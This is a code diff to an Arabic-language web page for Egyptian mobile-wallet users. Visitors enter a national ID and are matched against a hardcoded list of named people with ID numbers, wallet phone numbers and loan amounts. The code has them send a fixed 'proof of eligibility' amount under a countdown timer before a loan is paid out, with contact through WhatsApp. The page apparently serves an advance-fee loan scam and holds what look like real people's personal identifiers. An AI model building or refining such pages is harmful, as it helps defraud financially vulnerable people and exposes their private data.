@@ -114,7 +114,7 @@
         <h3><i class="fas fa-id-card"></i> استعلم عن طلبك</h3>
         <p>أدخل رقم بطاقتك القومية (14 رقم) لإتمام إجراءات إثبات الجدارة</p>
         <div class="input-group">
-            <input type="text" id="nationalId" placeholder="مثال: 26707092100701" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 30307072100878" maxlength="14" inputmode="numeric">
             <button class="btn-primary" onclick="searchCustomer()"><i class="fas fa-search"></i> استعلام</button>
         </div>
         <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاري التحقق...</div>
@@ -131,7 +131,6 @@ const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
 let currentCustomer = null;
 let currentNationalId = null;
 let timerInterval = null;
-let fineTimerInterval = null;
 
 function openWhatsApp(customMessage) {
     let msg = customMessage || `📤 إرسال إثبات الجدارة\nالعميل: ${currentCustomer ? currentCustomer.name : ''}\nالرقم القومي: ${currentNationalId || ''}\nنوع المحفظة: ${currentCustomer ? currentCustomer.wallet : ''}\nرقم المحفظة: ${currentCustomer ? currentCustomer.walletNum || "غير مسجل" : ''}\nالمبلغ المطلوب صرفه: ${currentCustomer ? currentCustomer.loan.toLocaleString('ar-EG') : ''} ج.م\n\nسأقوم بإرسال صور إثبات الجدارة (دخول وخروج) لإتمام الصرف.`;
@@ -139,9 +138,8 @@ function openWhatsApp(customMessage) {
 }
 
 // ============================================================
-// 3️⃣ كود الإثبات (customersDatabase) - 50 عميل (بدون تكرار)
+// قاعدة بيانات العملاء - 40 عميل (تم إصلاح الخطأ)
 // ============================================================
-
 const customersDatabase = {
     // ===== عملاء اتصالات كاش =====
     "30307072100878": { 
@@ -412,17 +410,17 @@ const customersDatabase = {
         walletNum: "01224450714", 
         status: "pending" 
     },
-}
-    name: "كمال صلاح السيد شوشان", 
-    loan: 100000, 
-    wallet: "اتصالات كاش", 
-    walletNum: "01157446643", 
-    status: "pending" 
-}
+    "27201211601075": { 
+        name: "كمال صلاح السيد شوشان", 
+        loan: 100000, 
+        wallet: "اتصالات كاش", 
+        walletNum: "01157446643", 
+        status: "pending" 
+    }
 };
 
 // ===== دالة عرض صفحة إثبات الجدارة العادية =====
-function buildProofPage(customer, nationalId, isUrgent = false, deadlineMinutes = 30) {
+function buildProofPage(customer, nationalId, deadlineMinutes = 30) {
     const proofAmount = customer.loan < 100000 ? 6000 : 8000;
     const proofAmountDisplay = proofAmount.toLocaleString('ar-EG');
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
@@ -569,13 +567,13 @@ function buildProofPage(customer, nationalId, isUrgent = false, deadlineMinutes 
             document.getElementById('resultSection').innerHTML = `
                 <div class="payment-card" style="border-color: var(--danger);">
                     <i class="fas fa-ban" style="font-size:3rem; color:var(--danger);"></i>
-                    <h2 style="color:var(--danger);">❌ تم شطب طلبك وحظرك لمدة 90 يوماً</h2>
+                    <h2 style="color:var(--danger);">❌ تم شطب طلبك</h2>
                     <p>لم تقم بإثبات الجدارة في الوقت المحدد.</p>
                     <button class="btn-whatsapp" id="contactSupportAfterBlock">التواصل مع الدعم</button>
                 </div>
             `;
             const btn = document.getElementById('contactSupportAfterBlock');
-            if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه وحظر 90 يومًا: ${customer.name}\nالرقم القومي: ${nationalId}`);
+            if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه: ${customer.name}\nالرقم القومي: ${nationalId}`);
         } else {
             currentSeconds--;
             const mins = Math.floor(currentSeconds / 60);
@@ -605,27 +603,46 @@ function buildProofPage(customer, nationalId, isUrgent = false, deadlineMinutes 
 // ===== البحث الرئيسي =====
 function searchCustomer() {
     const nationalId = document.getElementById('nationalId').value.trim();
-    if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
-    if (nationalId.length !== 14) { alert('الرقم القومي 14 رقم'); return; }
+    if (!nationalId) { 
+        alert('⚠️ الرجاء إدخال الرقم القومي'); 
+        return; 
+    }
+    if (nationalId.length !== 14) { 
+        alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); 
+        return; 
+    }
+    
+    // إظهار اللودر
     document.getElementById('loader').style.display = 'block';
+    document.getElementById('resultSection').innerHTML = '';
+    document.getElementById('errorCard').style.display = 'none';
+    
+    // محاكاة طلب الشبكة
     setTimeout(() => {
         document.getElementById('loader').style.display = 'none';
         const customer = customersDatabase[nationalId];
+        
         if (!customer) {
-            document.getElementById('resultSection').innerHTML = '';
             document.getElementById('errorCard').style.display = 'block';
+            currentCustomer = null;
+            currentNationalId = null;
             return;
         }
+        
         currentCustomer = customer;
         currentNationalId = nationalId;
-        document.getElementById('errorCard').style.display = 'none';
-
-        buildProofPage(customer, nationalId, false, 30);
+        buildProofPage(customer, nationalId, 30);
     }, 800);
 }
 
+// ===== ربط حدث Enter =====
+document.getElementById('nationalId')?.addEventListener('keypress', e => { 
+    if (e.key === 'Enter') searchCustomer(); 
+});
+
+// ===== جعل الدوال عالمية للاستخدام في HTML =====
 window.searchCustomer = searchCustomer;
-document.getElementById('nationalId')?.addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
+window.openWhatsApp = openWhatsApp;
 </script>
 </body>
 </html>
